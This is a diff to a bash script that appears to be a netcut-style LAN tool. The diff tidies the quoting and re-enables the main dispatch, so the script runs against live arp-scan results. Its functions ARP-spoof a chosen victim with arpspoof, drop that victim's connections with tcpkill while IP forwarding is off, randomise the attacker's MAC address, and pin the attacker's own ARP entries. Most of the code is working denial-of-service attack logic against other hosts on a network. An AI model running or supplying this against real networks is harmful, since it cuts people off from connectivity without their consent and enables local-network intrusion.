@@ -485,13 +485,11 @@ function parse_params() {
 
 
 function enable_protection(){
-	local gw=$1
-	local mac=$2
 	arptables -F
 	arptables -P INPUT DROP
     arptables -P OUTPUT DROP
-    arptables -A INPUT -s $gw --source-mac $mac -j ACCEPT
-    arptables -A OUTPUT -d $gw --destination-mac $mac -j ACCEPT
+    arptables -A INPUT -s "${gw-}" --source-mac "${mymac-}" -j ACCEPT
+    arptables -A OUTPUT -d "${gw-}" --destination-mac "${mymac-}" -j ACCEPT
 }
 
 function disable_protection(){
@@ -504,21 +502,23 @@ function netcutvictim() {
 	local gw=$1
 	local victim=$2
     run_as_root sysctl -w net.ipv4.ip_forward=0 &>/dev/null
-    run_as_root arpspoof -t $gw $victim &>/dev/null &
+    run_as_root arpspoof -t "$gw" "$victim" &>/dev/null &
 	local arpspoof_pid=$!
-    run_as_root tcpkill -i ${iface-} -3 net $victim &>/dev/null &
+    run_as_root tcpkill -i "${iface-}" -3 net "$victim" &>/dev/null &
 	local tcpkill_pid=$!
-	update_pid_machine_list $arpspoof_pid $tcpkill_pid $victim 1
+	update_pid_machine_list "$arpspoof_pid" "$tcpkill_pid" "$victim" 1
 }
 
 function netresume_single_host() {
 	local victim="$1"
-	local machine_data=$(select_machine true $victim )
+	local machine_data
+    machine_data=$(select_machine true "$victim" )
 	verbose_print "$machine_data" $fg_green
-	local a=(`echo $machine_data | sed 's/|/\n/g'`)
-	run_as_root kill -n 9 ${a[5]} #arpspoof_pid
-	run_as_root kill -n 9 ${a[6]} #tcpkill_pid
-	update_pid_machine_list null null $victim 0
+	local a
+    read -a a <<< "$machine_data"
+	run_as_root kill -n 9 "${a[5]}" #arpspoof_pid
+	run_as_root kill -n 9 "${a[6]}" #tcpkill_pid
+	update_pid_machine_list null null "$victim" 0
 }
 
 function netresumeall() {
@@ -530,11 +530,12 @@ function netresumeall() {
 
 function change_mac() {
 	local hexchars="0123456789ABCDEF"
-	local end=$( for i in {1..12} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/-\1/g' ) 
+	local end
+    end=$( for i in {1..12} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/-\1/g' ) 
 	end=${end#*-}
 	verbose_print "New MAC will be $end" ${fg_yellow-}
-	ifconfig ${iface-} down hw ether $end
-	ifconfig ${iface-} up
+	ifconfig "${iface-}" down hw ether "$end"
+	ifconfig "${iface-}" up
 }
 
 function default_gw(){
@@ -542,7 +543,8 @@ function default_gw(){
 	do
 		#'none default via 30.147.0.1 dev wifi0 proto unspec metric 0'
 		if [[ $line = *"default"* ]]; then
-			local a=(`echo $line | sed 's/ /\n/g'`)
+			local a
+            read -a a <<< "$line"
 			gw=${a[3]}
 			iface=${a[5]}
             mymac=$(cat /sys/class/net/"${iface-}"/address)
@@ -559,12 +561,13 @@ function arpscan(){
 	while read -r line
 	do
 		if [[ $line =~ ^([0-9]{1,3}.?){4}.+$ ]]; then
-			local a=(`echo $line | sed 's/ /\n/g'`)
+			local a
+            read -a a <<< "$line"
 			insert_into_machine_list "${a[0]}" "${a[1]}"
 			verbose_print "inserting machine ${a[0]} with mac ${a[1]}"
 		fi
-	done < testscan.txt
-	# done < <(run_as_root arp-scan -l)
+	# done < testscan.txt
+	done < <(run_as_root arp-scan -l)
 }
 
 function insert_into_machine_list(){
@@ -621,22 +624,21 @@ function main() {
     lock_init system
 	#change_mac
 	default_gw
-	# if $flush; then
-	# 	netresumeall
-	# 	refresh
-	# 	arpscan
-	# elif $scanonly; then 
-	# 	arpscan
-	# elif $cut_off; then 
-	# 	enable_protection
-	# 	netcutvictim ${gw-} ${victim-}
-	# elif $resume_single; then 
-	# 	netresume_single_host ${victim-}
-	# elif $resume_all; then
-	# 	netresumeall
-	# 	disable_protection
-	# fi
-    echo ${mymac-}
+	if $flush; then
+		netresumeall
+		refresh
+		arpscan
+	elif $scanonly; then 
+		arpscan
+	elif $cut_off; then 
+		enable_protection
+		netcutvictim "${gw-}" "${victim-}"
+	elif $resume_single; then 
+		netresume_single_host "${victim-}"
+	elif $resume_all; then
+		netresumeall
+		disable_protection
+	fi
 	select_machine false
 }
 
